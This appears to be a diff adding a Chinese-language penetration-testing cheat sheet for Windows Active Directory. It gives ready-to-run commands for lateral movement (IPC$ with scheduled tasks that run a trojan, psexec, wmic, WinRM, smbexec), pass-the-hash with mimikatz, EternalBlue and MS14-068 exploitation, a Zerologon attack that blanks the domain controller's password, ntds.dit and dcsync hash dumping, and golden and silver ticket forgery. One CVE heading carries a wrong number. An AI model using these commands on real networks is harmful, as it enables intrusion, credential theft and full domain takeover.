@@ -1,0 +1,162 @@
+获得明文账户密码                            
+	IPC+定时任务
+		//对方开启ipc共享，139，445端口开放，
+		1、创建IPC连接
+			net use \\ip\ipc$  <password> /user:<username>                //输入明文账户密码，建立ipc连接
+			shell copy  C:\cale.bat \\10.0.19.65\c$                                    // 我一般写 start 123.exe 执行exe木马上线cs/msf  
+			shell copy  C:\123.exe \\10.0.19.65\c$                                    //将脚本和木马复制到目标
+			shell schtasks /create /tn task1 /s 10.0.19.13 /tr C:\cale.bat /sc ONSTART /RU system /f              //开启定时任务
+			schtasks /run /tn task1 /s 10.0.19.13 /I                                                                                            //立即执行定时任务
+			schtasks /delete /s 10.0.19.13/tn test1 /f                                                                                         //删除定时任务
+			net use \\IP /del /y                                                                                                                          //删除ipc连接
+			                                                                                                    //创建ipc连接如果错误，可以根据错误号判断失败原因
+			
+	 psexec
+	                  //目标机器开启admin$
+		通过pstools工具
+			psexec.exe \\186.64.10.13 -u <username> -p <password>  <Command>                           //执行cmd.exe便可返回交互shell,或者直接执行命令
+		Msf,cs等也有此模块，也有powershell版
+		
+	Wmic
+		      //135，445端口
+		wmic /node:186.64.10.13 /user:<username> /password:<password> process list brief                   //查询进程信息
+		
+	WinRM
+		        //windows2012以后默认开启，默认监听5985\5986端口 ，
+		winrs -r:http://186.64.10.13:5985 -u <username> -p <password> "cmd.exe"
+	
+	
+	SmbExec
+		      //445端口.基于psexec的域渗透测试工具
+		Smbexec.py <username>:<password>@10.0.19.13                                           //
+		
+		
+PTH(hash传递)
+	mimikatz利用
+		1、sekurlsa::pth /domain:<域名> /user:<username> /ntlm: <ntlmhash>                          //抓取hash后注入内存
+		2、此时便可免密使用ipc,psexec等横向移动
+	cs利用
+		1、mimikatz sekurlsa::pth /user:administrator /domain:<域名> /ntlm:<ntlmhash> /run:"cmd -w hidden"              //（若为工作组环境，则命令修改为/domain:.）
+		2、steal_token <PID>                                             // beason中利用steal_token窃取令牌，便实现pth
+	msf利用
+		psexec_command模块
+		psexec_psh模块
+		
+永恒之蓝漏洞
+	          //在跳板机或者msf添加路由以后扫描网段，尝试批量上线主机（或者其他工具插件）
+	msf利用
+		1、扫描漏洞
+			use auxiliary/scanner/smb/smb_ms17_010                //加载模块
+			set   RHOSTS 10.0.19.0/24
+			set  threads  XX                                                          //设置参数
+			Run
+		2、攻击
+			use exploit/windows/smb/ms17_010_eternalblue        //加载模块
+		        set  ……                                                                         //设置参数
+			run
+	cs插件等（不多说）
+	
+特权提升
+                 //利用漏洞提升至域管权限，在进行横向移动
+	1、ms14-068
+		       //利用条件，域名，域用户名称，SID，密码
+		ms14-068py.exe -u <username> -p <"password"> -s <用户sid> -d <域控名全称>                   //生成票据
+		mimikatz # kerberos::purge                                                         //清空当前凭证
+		mimikatz # kerberos::list                                                            //查看当前机器凭证
+		mimikatz # kerberos::ptc 票据文件                                             //将上一步生成的票据注入到内存中
+		      //成功后，便可利用域管进行横向移动
+		
+	2、cve-2020-1742                                 //任意和主机建立tcp连接即可，无需是域内用户
+	                 //https://github.com/SecuraBV/CVE-2020-1472           //   漏洞验证攻击
+	                //https://github.com/risksense/zerologon                     //   漏洞复现工具
+	                // https://github.com/SecureAuthCorp/impacket          //   impacket安装
+		python zerologon_tester.py <域控主机名> <域控ip>                          //poc检测
+		python cve-2020-1472-exploit.py <域控主机名> <域控ip>               //攻击域控，将域控机器密码置空
+		python secretsdump.py <域名>/<域控主机名>\$@<域控ip> -no-pass               //使用impacket中的secretdump获取域管hash
+		              //此时域控机器密码已被置空，获取所有用户hash,进行横向移动
+		              #获取完成后，记得恢复域控密码，否则可能导致域控主机脱域
+		
+导出所有用户hash
+	卷影拷贝提取mtds.dit 并导出hash
+	   卷影拷贝服务提取 ntds.dit         
+		1、通过ntdsutil.exe提取                   //支持win2003,win2008,win2012，默认安装
+			ntdsutil snapshot "activate instance ntds" create quit quit                             //在域控机器中执行，创建快照
+			ntdsutil snapshot "mount {GUID}" quit quit                                                     //加载刚刚创建的快照，GUID是快照的GUID
+			copy C:\$SNAP_XXXXXXXX_VOLUMEC$\windows\ntds\ntds.dit   c:\tmp\ntds.dit            //将快照文件复制
+			ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit                                         //卸载并删除快照
+			ntdsutil snapshot "List All" quit quit                                                                                   //查询若没有快照则删除成功
+		2、利用 vssadmin 提取 ntds.dit              //支持win2008 win7
+			vssadmin create shadow /for=c:                                                  //首先创建一个 C 盘的卷影拷贝
+			copy  <shadow CopyVolume Name>\windows\NTDS\ntds.dit c:\tmp\ntds.dit   //   在创建的卷影拷贝中将 ntds.dit 复制出来
+			vssadmin delete shadows /for:c: /quiet                                           //删除快照
+		3、利用 vssown.vbs 脚本提取 ntds.dit
+			cscript vssown.vbs /start                                                                   //启动卷影拷贝服务
+			cscript vssown.vbs /create c                                                              //列出当前卷影拷贝
+			cscript vssown.vbs /list
+			copy  <shadow CopyVolume Name>\windows\NTDS\ntds.dit c:\tmp\ntds.dit   //   在创建的卷影拷贝中将 ntds.dit 复制出来
+			cscript vssown.vbs /delete <ID>                                                                             //删除卷影拷贝
+		4、使用 ntdsutil 的 IFM 创建卷影拷贝
+			ntdsutil "ac i ntds" "ifm" "create full c:/test" q q                     //将 ntds.dit 复制到 c:\test\Active Directory\ 文件夹下,并将 SYSTEN 和 SECURITY 两项复制到 c:\test
+			                                                                                                  //                     \registry 文件夹下  
+			import-module .\Copy-VSS.ps1                                                
+			Copy-vss                                                                                   //利用powershell脚本 Copy-VSS.ps1，将 SAM、SYSTEM，ntds.dit 复制到与ps1脚本相同的目录。
+			rmdir /s/q test                                                                         //将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除              
+		5、使用 diskshadow 导出 ntds.dit
+			将以下脚本写入commmand.txt
+			''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+				set context persistent nowriters
+				add volume c: alias someAlias
+				create
+				expose %someAlias% k:
+				exec "cmd.exe" /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit
+				delete shadows all
+				list shadows all
+				reset
+				exit
+			'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+			diskshadow /s c:\command.txt                                                         //   执行文本（在C:\windows\system32 目录下执行，不然会出错）
+			reg save hklm\system c:\windows\temp\system.hive                       //转储 system.hive 《system.hive中存放着ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的        
+			                                                                                                           //    信息》
+	  导出ntds.dit中的hash值
+		1、Impacket-secretsdump获取hash                                                         
+		                           //前提获取到ntds.dit和System-hive两个文件
+			impacket-secretsdump -system <path> -ntds <path>  LOCAL         //   -system：表示系统hive文件的路径（SYSTEM）
+			                                                                                                        //  -ntds：表示dit文件的路径（ntds.dit)
+		2、NTDSDumpex.exe获取hash
+		                         //将其和ntds.dit和System-hive放在同一目录下
+			NTDSDumpex.exe -d ntds.dit -s system                                               //导出域账户和hash
+	
+	利用dcsync获取域散列值
+		1、mimikatz 转储哈希值
+			域内任意主机，域管权限
+				lsadump::dcsync /domain:god.org /all /csv                                        //导出所有用户hash
+				lsadump::dcsync /domain:god.org /user:mary                                   //导出指定用户hash
+			域控机器转存hash
+				privilege::debug
+				log
+				lsadump::lsa /inject
+		2、powershell获取域内用户哈希值
+					// Invoke-DCSync.ps1 可以利用 dcsync 直接读取 ntds.dit，以获取域账号和域散列值。
+			Import-Module .\Invoke-DCSync.ps1
+			Invoke-DCSync -PWDumpFormat
+	
+票据传递攻击
+	黄金票据
+		1、制作条件
+			伪造的域管理员用户名、完整的域名、krbtgt的SID、krbtgt 的 NTLM Hash 或 AES-256 值
+		2、mimikatz伪造
+			kerberos::purge                                                       //mimikatz情空当前主机票据
+			kerberos::golden /user:<username> /domain:<完整域名> /sid:<域SID> /krbtgt:<NTLM hash> /ticket:<票据名,xxx.kiribi>   //生成票据
+			kerberos::ptt <票据名 ,xxx.kiribi>                                 //传递票据并注入内存
+			kerberos::tgt                                                                //检测票据是否在内存中
+		3、用cs等工具也能伪造，批量上线等等
+	白金票据
+		1、制造条件
+			域名、域 SID、目标服务器的 FQDN、可利用的服务、服务账号的 NTLM Hash、伪造的用户名
+		2、常见伪造服务 
+			CIFS、LDAP、HOST、HTTP、RPCSS等等
+		3、mimikatz伪造
+			mimikatz log "privilege::debug" "sekurlsa::logonpasswords"                              //获取服务的NTLMhash
+			kerberos::purge                                                                                                      //mimikatz清空主机票据
+			kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLMHash> /user:<伪造的用户名> /ptt  //伪造票据
+                                                                                                                               //伪造LDAP用户访问DCSync服务，查询 krbtgt的hash，，（然而实际上很鸡肋。。。。）
